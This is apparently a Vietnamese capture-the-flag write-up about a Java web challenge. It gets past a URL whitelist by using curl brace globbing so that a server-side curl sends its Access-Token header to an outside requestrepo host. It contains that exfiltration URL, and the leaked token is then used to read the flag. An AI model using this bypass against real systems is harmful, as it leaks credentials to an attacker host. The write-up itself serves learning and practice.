Bài cho một một web bằng java được build thành file `.jar`. Đọc source ta thấy flag nằm trong path `/api/flag`

```java
    @GetMapping("/flag")
    public ResponseEntity<Map<String, String>> getFlag(@RequestHeader(value="Access-Token", required=true) String accessToken){
        Map<String, String> response = new HashMap<>();
        if (accessToken == null || accessToken.isEmpty()){
            response.put("result", "fail");
            response.put("message", "Unauthorized");
            return ResponseEntity.status(403).body(response);
        }
        if (!accessToken.equals("[**REDACTED**]")){
            System.out.println(accessToken);
            response.put("result", "fail");
            response.put("message", "Access token is not Valid");
            return ResponseEntity.status(400).body(response);
        }
        response.put("result", "success");
        response.put("message", flag);
        return ResponseEntity.ok(response);
    }
```
Để lấy được thì ta phải gửi request với Header Access-Token đúng. Nhưng hiện tại chưa biết Access-Token là gì.
Tiếp tục phân tích source thì thấy trong file `ApiTestController` có thực hiện curl một url và được set header `Access-Token`
![image](https://github.com/user-attachments/assets/04d0fa9a-d144-4b56-bbbd-831044e83abe)
Do url này được filter khá nhiều: scheme, user, host white list local, path.
Sau hồi tìm kiểm mình tìm được một cách url có thể bypass được 
Với câu lệnh sau
```
curl http://example.com/{path1,path2}
```
Thực hiện request tới 2 url `http://example.com/path1` và `http://example.com/path2`. Tức là sẽ ghép lần lượt các phần tử trong `{}` với chuỗi đằng trước để ra được url.
Lợi dụng điểm này ta sẽ tạo ra câu lệnh như sau
```
curl http://pd6lhjct.requestrepo.com{@localhost/,/}
```
Câu lệnh này sẽ thực hiện ghép 2 phần trong {} thành 1 url `http://pd6lhjct.requestrepo.com@localhost/` (localhost) và 1 url `http://pd6lhjct.requestrepo.com/` để bắt được request đọc header `Access-Token`
Tương ứng với các tham số `user=pd6lhjct.requestrepo.com{`, `host=localhost`, `path=/,/}`
Thực hiện gửi request

![image](https://github.com/user-attachments/assets/bd904a93-4666-454c-a948-d5e1e64939ce)

Nhận được Access-Token
![image](https://github.com/user-attachments/assets/12118285-3dfc-4001-b832-8f062106c2e0)

Lấy flag
![image](https://github.com/user-attachments/assets/07f18db8-6b60-479e-bab3-16b74cef0da4)


